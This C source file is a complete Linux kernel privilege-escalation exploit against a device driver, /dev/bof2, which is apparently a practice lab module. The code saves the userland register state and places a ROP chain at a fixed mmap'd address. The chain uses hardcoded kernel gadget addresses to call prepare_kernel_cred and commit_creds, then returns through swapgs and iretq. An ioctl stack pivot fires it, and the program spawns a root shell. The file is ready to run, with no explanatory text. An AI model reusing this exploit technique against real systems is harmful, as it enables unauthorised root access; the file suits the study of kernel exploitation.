#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#include "../bof2.h"

#define MAX_MSG 1024

typedef struct read_write_stack{
	unsigned long size;
	long msg[MAX_MSG];
} read_write_stack;

void spawn_shell(){
    printf("[+] Returned to userland, spawning root shell...\n");
    if(getuid() == 0){
        printf("[+] Privilege level successfully escalated, spawning shell...\n");
	char *arg[2] = {"/bin/sh", NULL};
        execve("/bin/sh", arg, NULL);
	exit(0);
    }else{
        printf("[-] Failed to escalate privileges, exiting...\n");
        exit(-1);
    }
}

unsigned long user_cs, user_ss, user_sp, user_rflags;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;" // setting intel syntax
        "mov user_cs, cs;" // saving address of code segment
        "mov user_ss, ss;" // saving address of stack segment
        "mov user_sp, rsp;" // saving stack pointer
        "pushf;" // push flag register onto stack
        "pop user_rflags;" // saving flag register
        ".att_syntax;"        
    );
}  

unsigned long user_rip = (unsigned long)spawn_shell;

#ifdef AT_HOME
unsigned long stacklift = 0xffffffff81458a59; // mov esp, 0x5b000000 ; pop rbp ; ret
unsigned long newstack = 0x5b000000;
unsigned long pop_rdi_ret = 0xffffffff81001568; // pop rdi; ret;
unsigned long prepare_kernel_cred = 0xffffffff8108c220;
unsigned long pop_rdx_ret = 0xffffffff8104a738; // pop rdx; ret;
unsigned long cmp_rdx_8_jne_ret = 0xffffffff81aa4321; // cmp rdx, 8; jne; ret;
unsigned long mov_rdi_rax_jne_xor_ret = 0xffffffff813e5f04; // mov rdi, rax; jne; xor eax, eax; ret;
unsigned long commit_creds = 0xffffffff8108bde0;
unsigned long swapgs_nop3_xor_ret = 0xffffffff81c01036; // swapgs; nop x 3; xor; ret;
unsigned long iretq = 0xffffffff810261eb; // iretq
#else
unsigned long stacklift = 0xffffffff81457dc9; // mov esp, 0x5b000000 ; pop rbp ; ret
unsigned long newstack = 0x5b000000;
unsigned long pop_rdi_ret = 0xffffffff81001568; // pop rdi; ret;
unsigned long prepare_kernel_cred = 0xffffffff8108c240;
unsigned long pop_rdx_ret = 0xffffffff8101c946; // pop rdx; ret;
unsigned long cmp_rdx_8_jne_ret = 0xffffffff81aa2871; // cmp rdx, 8; jne; ret;
unsigned long mov_rdi_rax_jne_xor_ret = 0xffffffff813e52e4; // mov rdi, rax; jne; xor eax, eax; ret;
unsigned long commit_creds = 0xffffffff8108be00;
unsigned long swapgs_nop3_xor_ret = 0xffffffff81c01036; // swapgs; nop x 3; xor; ret;
unsigned long iretq = 0xffffffff810261db; // iretq
#endif

void create_rop_mem(){
    printf("[+] Creating ROP chain on memory...\n");
    unsigned long *mem = mmap((void*)newstack-0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    mem[0] = 0x31337;
    unsigned int off = 0x1000 / 8;
    mem[off++] = 0x1337;
    mem[off++] = pop_rdi_ret; // pop rdi; ret;
    mem[off++] = 0; // to rdi
    mem[off++] = prepare_kernel_cred;
    mem[off++] = pop_rdx_ret; // pop rdx; ret;
    mem[off++] = 8; // to rdx
    mem[off++] = cmp_rdx_8_jne_ret; // cmp rdx, 8; jne; ret;
    mem[off++] = mov_rdi_rax_jne_xor_ret; // mov rdi, rax; jne; xor eax, eax; ret;
    mem[off++] = commit_creds;
    mem[off++] = swapgs_nop3_xor_ret; // swapgs; nop; nop; nop; xor rbx, rbx ret;
    mem[off++] = iretq;
    mem[off++] = user_rip;
    mem[off++] = user_cs;
    mem[off++] = user_rflags;
    mem[off++] = user_sp;
    mem[off++] = user_ss;
}

int main(){
	int fd;
	long ret;

    save_state();

	printf("[+] Opening device file...\n");
	fd = open("/dev/bof2", O_RDWR);
	if(fd < 0){
		printf("[-] Failed to open device file\n");
		exit(-1);
	}

    create_rop_mem();

    printf("[+] Sending payload...\n");

    ret = ioctl(fd, IOCTL_FUNC, stacklift);
    if(ret < 0){
        printf("[-] Failed to write to run function\n");
        exit(-1);
    }    

	return 0;
}
